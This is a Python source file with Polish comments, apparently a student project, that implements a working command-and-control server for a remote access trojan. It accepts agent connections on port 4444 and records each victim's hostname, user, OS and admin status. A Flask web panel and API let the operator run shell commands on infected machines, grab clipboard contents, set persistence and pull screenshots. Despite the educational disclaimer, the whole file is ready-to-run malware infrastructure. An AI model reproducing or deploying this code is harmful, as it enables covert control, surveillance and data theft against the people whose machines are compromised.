#!/usr/bin/env python3
"""
============================================================
 UWAGA: Plik stworzony wyłącznie w celach edukacyjnych.
 Projekt akademicki — demonstracja technik RAT w izolowanym
 środowisku laboratoryjnym. Nie używać poza środowiskiem
 kontrolowanym przez uczelnię.

 Autor:    dddd
 Uczelnia: Uniwersytet Vizja
 Przedmiot: Projekt zespołowy — RAT malware z serwerem C2
 Rok akademicki: 2025/2026
============================================================

Uruchomienie:
    pip install flask
    python c2_server.py

Porty:
    4444  TCP  — gniazdo dla agentów RAT
    5000  HTTP — panel webowy (Flask)
"""

import socket
import threading
import struct
import datetime
import logging
import io

from flask import Flask, render_template, request, jsonify, send_file

# ─── Konfiguracja ──────────────────────────────────────────
C2_HOST    = "0.0.0.0"
C2_PORT    = 4444
WEB_PORT   = 5000
END_MARKER = "<<END>>\n"   # musi być identyczny z #define END_MARKER w kliencie C++

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("C2")

sessions:     dict = {}
sessions_lock       = threading.Lock()
_next_id            = [1]


# ════════════════════════════════════════════════════════════
#  HELPERY SIECIOWE
# ════════════════════════════════════════════════════════════

def recv_response(sock: socket.socket) -> str:

    buf = ""
    while END_MARKER not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionResetError("Agent rozłączony")
        buf += chunk.decode("utf-8", errors="replace")
    return buf.replace(END_MARKER, "").strip()


def recv_raw_n(sock: socket.socket, n: int) -> bytes:
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionResetError("Agent rozłączony (odbiór binarny)")
        data += chunk
    return data


def send_command(sock: socket.socket, cmd: str):
    sock.sendall((cmd + "\n").encode("utf-8"))


def parse_sysinfo(raw: str) -> dict:
    info = {"raw": raw, "hostname": "?", "username": "?",
            "os": "?", "local_ip": "?", "admin": "?"}
    for line in raw.splitlines():
        if   line.startswith("Hostname:"):  info["hostname"]  = line.split(":",1)[1].strip()
        elif line.startswith("Username:"):  info["username"]  = line.split(":",1)[1].strip()
        elif line.startswith("OS:"):        info["os"]        = line.split(":",1)[1].strip()
        elif line.startswith("Local IP:"): info["local_ip"]  = line.split(":",1)[1].strip()
        elif line.startswith("Admin:"):     info["admin"]     = line.split(":",1)[1].strip()
    return info


# ════════════════════════════════════════════════════════════
#  OBSŁUGA AGENTA — wątek per połączenie
# ════════════════════════════════════════════════════════════

def handle_agent(sock: socket.socket, addr: tuple):
    """
    Protokół handshake:
      1. Odczytaj 1 bajt magic (0x01=dropper odrzuć, 0x02=RAT akceptuj)
      2. Odbierz automatyczny sysinfo + END_MARKER
      3. Zarejestruj sesję
      4. Monitoruj połączenie — wątek blokuje się aż do rozłączenia
    """
    ip, port = addr
    log.info(f"Połączenie: {ip}:{port}")

    # 1. Magic byte
    try:
        magic = sock.recv(1)
        if not magic:
            sock.close(); return
        if magic[0] == 0x01:
            log.info(f"{ip}:{port} — dropper (0x01), odrzucam")
            sock.close(); return
        if magic[0] != 0x02:
            log.warning(f"{ip}:{port} — nieznany magic 0x{magic[0]:02x}")
            sock.close(); return
        log.info(f"{ip}:{port} — RAT agent (0x02) zaakceptowany")
    except Exception as e:
        log.error(f"Magic byte error {ip}:{port}: {e}")
        sock.close(); return

    # 2. Automatyczny sysinfo wysyłany przez klienta zaraz po połączeniu
    try:
        sysinfo_raw = recv_response(sock)
        info = parse_sysinfo(sysinfo_raw)
    except Exception as e:
        log.error(f"Sysinfo error {ip}:{port}: {e}")
        info = {"raw": "", "hostname": ip, "username": "?",
                "os": "?", "local_ip": ip, "admin": "?"}

    # 3. Rejestracja sesji
    with sessions_lock:
        sid = _next_id[0]; _next_id[0] += 1
        sessions[sid] = {
            "id":           sid,
            "addr":         (ip, port),
            "sock":         sock,
            "lock":         threading.Lock(),
            "connected":    True,
            "sysinfo":      info["raw"],
            "hostname":     info["hostname"],
            "username":     info["username"],
            "os":           info["os"],
            "local_ip":     info["local_ip"],
            "admin":        info["admin"],
            "connected_at": datetime.datetime.now().isoformat(timespec="seconds"),
            "history": [{
                "ts":        datetime.datetime.now().isoformat(timespec="seconds"),
                "direction": "recv",
                "content":   info["raw"] or "(brak sysinfo)"
            }],
            "screenshots": []
        }
    log.info(f"Sesja #{sid}: {info['hostname']} @ {ip}")

    # 4. Monitoruj żywotność — recv z timeoutem, b"" = rozłączony
    sock.settimeout(10.0)
    try:
        while True:
            try:
                if sock.recv(1, socket.MSG_PEEK) == b"":
                    raise ConnectionResetError
            except socket.timeout:
                pass   # cisza = agent żyje
    except (ConnectionResetError, OSError):
        pass
    finally:
        with sessions_lock:
            if sid in sessions:
                sessions[sid]["connected"] = False
        try: sock.close()
        except: pass
        log.info(f"Sesja #{sid} zakończona")


# ════════════════════════════════════════════════════════════
#  TCP LISTENER — wątek tła
# ════════════════════════════════════════════════════════════

def tcp_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((C2_HOST, C2_PORT))
    srv.listen(50)
    log.info(f"TCP nasłuchuje na {C2_HOST}:{C2_PORT}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_agent, args=(conn, addr),
                             daemon=True).start()
        except Exception as e:
            log.error(f"Accept error: {e}")


# ════════════════════════════════════════════════════════════
#  FLASK — REST API + PANEL WEBOWY
# ════════════════════════════════════════════════════════════

app = Flask(__name__, template_folder="templates", static_folder="static")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/sessions")
def api_sessions():
    """Zwraca listę wszystkich sesji (bez gniazda)."""
    with sessions_lock:
        return jsonify([{
            "id":           s["id"],
            "ip":           s["addr"][0],
            "port":         s["addr"][1],
            "hostname":     s["hostname"],
            "username":     s["username"],
            "os":           s["os"],
            "local_ip":     s["local_ip"],
            "admin":        s["admin"],
            "connected":    s["connected"],
            "connected_at": s["connected_at"],
            "history_len":  len(s["history"]),
            "screenshots":  len(s["screenshots"])
        } for s in sessions.values()])


@app.route("/api/session/<int:sid>/history")
def api_history(sid: int):
    """Historia komend i odpowiedzi dla danej sesji."""
    with sessions_lock:
        if sid not in sessions:
            return jsonify({"error": "Sesja nie istnieje"}), 404
        return jsonify(sessions[sid]["history"])


@app.route("/api/session/<int:sid>/send", methods=["POST"])
def api_send(sid: int):
    """
    Wysyła komendę do agenta i zwraca odpowiedź.
    Body JSON: { "cmd": "sysinfo" }

    Obsługiwane komendy:
        sysinfo | listproc | clipboard | persist
        shell <polecenie> | screenshot | exit
    """
    data = request.get_json(force=True, silent=True) or {}
    cmd  = data.get("cmd", "").strip()
    if not cmd:
        return jsonify({"error": "Brak komendy"}), 400

    with sessions_lock:
        if sid not in sessions:
            return jsonify({"error": "Sesja nie istnieje"}), 404
        sess = sessions[sid]

    if not sess["connected"]:
        return jsonify({"error": "Agent rozłączony"}), 410

    ts   = datetime.datetime.now().isoformat(timespec="seconds")
    sock = sess["sock"]
    lock = sess["lock"]

    with lock:
        try:
            with sessions_lock:
                sess["history"].append({"ts": ts, "direction": "send", "content": cmd})

            send_command(sock, cmd)

            # ── Screenshot — protokół binarny ──────────────────
            # Agent wysyła: [4B big-endian rozmiar][N bajtów JPEG]
            if cmd == "screenshot":
                size_b = recv_raw_n(sock, 4)
                size   = struct.unpack("!I", size_b)[0]
                if size == 0 or size > 30 * 1024 * 1024:
                    raise ValueError(f"Nieprawidłowy rozmiar JPEG: {size}")
                jpeg = recv_raw_n(sock, size)
                with sessions_lock:
                    idx = len(sess["screenshots"])
                    sess["screenshots"].append(jpeg)
                    sess["history"].append({
                        "ts":             datetime.datetime.now().isoformat(timespec="seconds"),
                        "direction":      "recv",
                        "content":        f"[screenshot #{idx} — {size} B JPEG]",
                        "screenshot_idx": idx
                    })
                return jsonify({"ok": True, "screenshot_idx": idx, "size": size})

            # ── Odpowiedź tekstowa ─────────────────────────────
            response = recv_response(sock)
            with sessions_lock:
                sess["history"].append({
                    "ts":        datetime.datetime.now().isoformat(timespec="seconds"),
                    "direction": "recv",
                    "content":   response
                })
            return jsonify({"ok": True, "response": response})

        except Exception as e:
            with sessions_lock:
                sess["connected"] = False
            log.error(f"Błąd sesja #{sid}: {e}")
            return jsonify({"error": str(e)}), 500


@app.route("/api/session/<int:sid>/screenshot/<int:idx>")
def api_screenshot(sid: int, idx: int):
    """Zwraca plik JPEG screenshotu."""
    with sessions_lock:
        if sid not in sessions:
            return jsonify({"error": "Sesja nie istnieje"}), 404
        screenshots = sessions[sid]["screenshots"]
        if idx >= len(screenshots):
            return jsonify({"error": "Screenshot nie istnieje"}), 404
        jpeg_data = screenshots[idx]
    return send_file(io.BytesIO(jpeg_data), mimetype="image/jpeg",
                     download_name=f"screenshot_{sid}_{idx}.jpg")


@app.route("/api/session/<int:sid>/disconnect", methods=["POST"])
def api_disconnect(sid: int):
    """Rozłącza sesję przez wysłanie komendy 'exit'."""
    with sessions_lock:
        if sid not in sessions:
            return jsonify({"error": "Sesja nie istnieje"}), 404
        sess = sessions[sid]
    if not sess["connected"]:
        return jsonify({"ok": True, "message": "Już rozłączony"})
    with sess["lock"]:
        try: send_command(sess["sock"], "exit")
        except: pass
        try: sess["sock"].close()
        except: pass
    with sessions_lock:
        sess["connected"] = False
    return jsonify({"ok": True})


# ════════════════════════════════════════════════════════════
#  PUNKT WEJŚCIA
# ════════════════════════════════════════════════════════════

if __name__ == "__main__":
    threading.Thread(target=tcp_listener, daemon=True).start()
    log.info(f"Panel webowy: http://127.0.0.1:{WEB_PORT}")
    app.run(host="0.0.0.0", port=WEB_PORT, debug=False, use_reloader=False)
